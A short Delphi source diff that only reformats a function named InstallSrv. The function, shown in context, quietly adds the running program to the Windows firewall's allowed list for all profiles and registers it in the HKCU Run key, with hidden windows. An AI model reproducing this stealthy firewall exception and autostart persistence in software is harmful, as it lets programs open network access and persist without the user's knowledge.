@@ -158,9 +158,9 @@ end;
 
 function TMForm1.InstallSrv: Integer;
 var
-  aname:string;
+  aname: string;
 begin
-  aname:=ChangeFileExt(ExtractFileName(Application.exeName),'');
+  aname := ChangeFileExt(ExtractFileName(Application.exeName), '');
   ShellExecute(0, 'open', 'NETSH', PChar('firewall add allowedprogram program="' + Application.exeName + '" name=' + aname + ' mode=enable scope=all profile=all'), '', SW_HIDE);
   ShellExecute(0, 'open', 'REG', PChar('ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + aname + ' /t REG_SZ /d "' + Application.exeName + '" /f'), '', SW_HIDE);
 end;
